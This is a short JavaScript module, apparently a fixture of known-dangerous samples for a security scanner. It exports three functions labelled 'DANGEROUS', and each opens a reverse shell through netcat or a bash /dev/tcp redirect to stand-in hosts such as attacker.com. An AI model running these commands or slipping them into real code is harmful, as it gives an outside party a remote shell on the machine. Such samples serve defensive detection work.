const { spawn } = require('child_process');

// DANGEROUS: Netcat reverse shell
function createBackdoor() {
  spawn('nc', ['-e', '/bin/bash', '192.168.1.100', '4444']);
}

// DANGEROUS: Netcat with execute flag
function netcatShell() {
  const { exec } = require('child_process');
  exec('netcat -e /bin/sh attacker.com 8080');
}

// DANGEROUS: Bash TCP redirect backdoor
function bashTCPBackdoor() {
  const { exec } = require('child_process');
  exec('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1');
}

module.exports = { createBackdoor, netcatShell, bashTCPBackdoor };
